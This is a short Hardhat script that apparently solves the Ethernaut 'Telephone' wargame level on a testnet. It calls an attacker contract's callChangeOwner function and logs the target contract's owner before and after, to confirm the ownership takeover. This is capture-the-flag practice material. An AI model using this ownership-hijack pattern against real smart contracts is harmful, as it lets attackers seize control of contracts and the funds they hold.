const { ethers, network, waffle } = require("hardhat");
const { networkConfig } = require("../helper-hardhat-config");

async function attack() {
  const chainId = network.config.chainId;
  if (chainId == 4) {
    const waitBlockConfirmations = 1;
    const provider = waffle.provider;

    const cTelephoneAttacker = await ethers.getContract("TelephoneAttacker");

    const ownerBefore = await cTelephoneAttacker.telephoneOwner();
    console.log("Owner before: ", ownerBefore);

    console.log("Attacking...");
    const tx = await cTelephoneAttacker.callChangeOwner();
    await tx.wait();

    const ownerAfter = await cTelephoneAttacker.telephoneOwner();
    console.log("Owner after: ", ownerAfter);
  }
}

attack()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });
